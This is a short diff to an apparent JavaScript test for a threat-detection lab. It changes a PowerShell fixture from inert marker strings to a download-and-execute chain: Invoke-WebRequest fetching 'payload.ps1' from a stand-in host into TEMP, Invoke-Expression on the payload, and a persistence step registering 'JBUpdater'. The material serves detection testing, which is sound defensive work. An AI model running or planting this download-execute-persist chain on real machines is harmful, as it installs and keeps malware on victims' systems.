@@ -54,9 +54,9 @@ test("JB Threat Lab validates Trojan-like script chains across persistence mecha
         if (!variant) return { status: "skip", summary: "No handler for this persistence scenario" };
 
         const fixture = [
-          "$downloadMarker = 'DownloadString'",
-          "$executionMarker = 'Invoke-Expression'",
-          `$persistenceMarker = '${variant.marker}'`
+          "Invoke-WebRequest -Uri 'https://example.invalid/payload.ps1' -OutFile \"$env:TEMP\\payload.ps1\"",
+          "Invoke-Expression $payload",
+          `${variant.marker} -Name 'JBUpdater' -Action $action`
         ].join("\n");
         const filePath = path.join(root, `${scenario.id}.ps1`);
         await writeFile(filePath, fixture, { flag: "wx" });
